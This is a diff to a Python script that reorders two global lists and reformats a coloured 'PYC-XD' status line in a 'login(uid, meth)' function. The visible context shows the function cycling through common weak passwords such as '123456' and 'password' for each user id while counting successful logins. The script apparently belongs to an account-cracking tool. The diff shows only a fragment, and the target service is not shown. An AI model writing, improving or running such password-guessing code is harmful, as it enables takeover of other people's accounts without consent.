@@ -60,10 +60,6 @@ def uaxxxx():
     return xx
 
 
-oks = []
-loop = []
-
-
 class sort:
 
     def line():
@@ -84,6 +80,10 @@ class sort:
         co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
         cx = random.choice(co)
         return cx
+
+
+oks = []
+loop = []
 
 
 def old():
@@ -137,7 +137,7 @@ def login(uid, meth):
     Session = requests.session()
     try:
         sys.stdout.write(
-            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r\r")
+            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~\x1b[1;97m{loop}-M{meth}\033[38;5;46m-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
         sys.stdout.flush()
         for pw in ["123456", "1234567", "12345678", "123456789", "password", "654321", "@#@#@#"]:
             if meth in ["1", "01", "A", "a"]:
